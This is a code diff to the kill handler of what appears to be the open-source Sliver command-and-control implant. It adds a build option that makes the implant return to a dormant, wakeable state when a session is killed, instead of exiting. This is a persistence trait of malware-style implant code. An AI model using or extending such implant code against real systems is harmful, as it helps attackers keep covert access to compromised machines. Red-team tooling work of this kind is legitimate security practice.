@@ -21,12 +21,14 @@ package handlers
 */
 
 import (
+	// {{if not .Config.IncludeTriggerWake}}
 	"os"
+	// {{end}}
 
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 
-	// {{if or .Config.IsSharedLib .Config.IsShellcode}}
+	// {{if and (not .Config.IncludeTriggerWake) (or .Config.IsSharedLib .Config.IsShellcode)}}
 
 	"syscall"
 
@@ -56,6 +58,16 @@ func killHandler(data []byte, _ *transports.Connection) error {
 	if err != nil {
 		return err
 	}
+	// {{if .Config.IncludeTriggerWake}}
+	// Trigger implants: do NOT terminate the process. The kill handler's
+	// presence in specialHandlers causes sessionMainLoop to return
+	// ErrTerminate, which makes sessionStartup return cleanly. The
+	// trigger loop in runner.Main then goes back to the dormant
+	// wake-wait state, ready to be woken again.
+	// {{if .Config.Debug}}
+	log.Println("[triggerwake] session kill -- returning to dormant state (no process exit)")
+	// {{end}}
+	// {{else}}
 	// {{if or .Config.IsSharedLib .Config.IsShellcode}}
 	// Windows only: ExitThread() instead of os.Exit() for DLL/shellcode slivers
 	// so that the parent process is not killed
@@ -71,5 +83,6 @@ func killHandler(data []byte, _ *transports.Connection) error {
 	log.Println("Let's exit!")
 	// {{end}}
 	os.Exit(0)
+	// {{end}}
 	return nil
 }
